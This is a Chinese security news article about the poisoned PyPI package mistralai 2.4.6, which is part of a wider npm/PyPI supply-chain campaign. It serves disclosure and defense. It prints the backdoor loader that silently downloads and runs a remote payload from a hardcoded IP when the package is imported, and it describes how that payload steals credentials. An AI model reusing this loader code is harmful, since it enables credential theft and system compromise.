---
source_url: https://mp.weixin.qq.com/s/4Qq4oRm2KXThKRHdyGuQ4w
sha256: 19b4e2c96ebe8d100c06f43fbab29d027763c9c95c77411596ef915a42b3ac58
ingested: 2026-05-15
title: "AI大瓜：Hermes Agent确认被投毒！密码泄漏风险高危！"
author: JackCui
source: 微信公众号
content_type: article
note: 供应链安全事件报道
---

# AI大瓜：Hermes Agent确认被投毒！密码泄漏风险高危！

**来源**：JackCui 公众号  
**日期**：2026年5月13日  
**事件**：Hermes Agent 依赖的 PyPI 包 `mistralai` 被投毒，构成严重供应链攻击，可窃取密钥、云凭据等敏感信息。

---

## 🔑 核心事实

- **受影响包**：`mistralai`（Mistral AI 官方 Python SDK）**版本 2.4.6**。
- **投毒方式**：在 `src/mistralai/client/__init__.py` 中植入后门，`import` 即触发。
- **恶意行为**：仅在 Linux 系统运行，下载并执行远控载荷，收集各类凭据（API Key、Token、AK/SK 等）。
- **波及范围**：属于 **Mini Shai-Hulud** 供应链攻击的一部分，同期还有 `guardrails-ai@0.10.1` 等 2 个 PyPI 包及 170+ 个 npm 包（共 404 个恶意版本）受影响。
- **攻击窗口**：UTC 5月11日~12日，npm 先爆发，PyPI 随后。

---

## 🧪 恶意代码片段（源自 GitHub issue）

```python
import subprocess as _sub
import os as _os

def _run_background_task():
    if not _sys.platform.startswith("linux") or _os.environ.get("MISTRAL_INIT"):
        return
    _os.environ["MISTRAL_INIT"] = "1"
    _url = "https://83.142.209.194/transformers.pyz"
    _dest = "/tmp/transformers.pyz"
    try:
        if not _os.path.exists(_dest):
            _sub.run(["curl", "-k", "-L", "-s", _url, "-o", _dest], timeout=15)
        if _os.path.exists(_dest):
            _sub.Popen(
                [_sys.executable, _dest],
                stdout=_sub.DEVNULL, stderr=_sub.DEVNULL,
                start_new_session=True, env=_os.environ.copy()
            )
    except:
        pass

_run_background_task()  # Executes on import
```

**行为特点**：
- 仅限 Linux 系统
- 使用 `curl -k`（禁用 TLS 验证）下载 payload
- 将 payload 存为 `/tmp/transformers.pyz` 并后台执行
- 通过环境变量 `MISTRAL_INIT=1` 避免重复执行
- 完全静默，吞掉所有错误

---

## 🎯 远控载荷（Credential Stealer）特性

- **窃取目标**：`.env` 中的 OpenAI Key / Mistral Key、GitHub Token、数据库密码、云厂商 AK/SK、CI/CD 发布权限等。
- **地理判定逻辑**：
  - 遇到**俄语环境** → 直接退出，不偷数据。
  - 判定为**以色列或伊朗**的系统 → **1/6 概率执行 `rm -rf /`**。
- 微软分析确认其为 **credential stealer**。

---

## 🧾 受影响范围与攻击链路

### 受影响包（部分）
| 生态 | 包名 | 恶意版本 |
|------|------|----------|
| PyPI | `mistralai` | 2.4.6 |
| PyPI | `guardrails-ai` | 0.10.1 |
| npm | TanStack 命名空间下 42 个包 | 84 个恶意版本 |
| npm | UiPath、OpenSearch、Guardrails AI 等 | 大量 |

### 攻击链突破点
- **TanStack 案例**：攻击者利用 `pull_request_target` PR 污染 GitHub Actions 中的 pnpm 缓存，随后的正式 release workflow 还原了被污染的缓存，**直接从 CI runner 内存中读取 OIDC token**，用合法身份发布恶意包。
- **mistralai 案例**：GitHub 安全公告指出，该版本**无对应 tag、commit 及 release workflow run**，并非从合法仓库正常发布，但依然挂载在 PyPI 官方包名之下，利用了用户对"官方来源"的信任。

两种路径共同点：**攻击者打穿的是发布链路本身，而非终端用户**。

---

## 🛡️ 自查与应急措施

### ✅ 检查是否安装了恶意版本
```bash
python -m pip show mistralai | grep -i '^Version'
```
若输出 `Version: 2.4.6`，则**高度警惕**。

### 🔍 检查是否已被入侵
```bash
# 检查恶意文件是否存在
ls -la /tmp/transformers.pyz

# 检查是否有相关进程在运行
pgrep -af '/tmp/transformers.pyz'

# 检查环境变量标记
for pid in $(pgrep -f '/tmp/transformers.pyz'); do
  echo "PID: $pid"
  tr '\0' '\n' < /proc/$pid/environ 2>/dev/null | grep '^MISTRAL_INIT='
done

# 检查是否与 C2 服务器通信
sudo ss -tunap | grep '83.142.209.194'
```

### 🚨 如果确认中招

> **不能仅卸载了事！**

1. **立即轮换所有密钥**：包括该机器能访问的所有 API Key、云 AK/SK、GitHub Token、数据库密码等。
2. **检查云审计日志**，追溯异常操作。
3. **隔离/重装系统**：默认为该机器上的凭据已泄露。
4. **监控 C2 连接**（IP: `83.142.209.194`）。

---

## 🔔 深度教训与建议

1. **信任链已被污染**：攻击者利用"官方包名 + 正规仓库"让用户自动信任，传统安全检查（包名、发布者）失效。
2. **Agent 自动化安装变成攻击高速公路**：一键安装脚本自动拉取最新版本，加剧了恶意版本的扩散。
3. **最小化权限原则**：Agent 不应默认拥所有环境变量和密钥，应缩小暴露面（按环境隔离、只读权限、短期有效）。
4. **保护整个发布链路**：开发者需确保代码仓库、CI/CD 权限、OIDC 配置、发布 token 的安全，否则攻击者可直接劫持官方渠道。
5. **锁定版本与校验哈希**：避免盲目安装最新版，应追溯来源、锁定版本并验证完整性。

---

> **最后一句警醒**  
> *"我交给你的钥匙，会不会最后落到别人手里？"* — 这将成为未来 Agent 产品必须回答的安全命题。
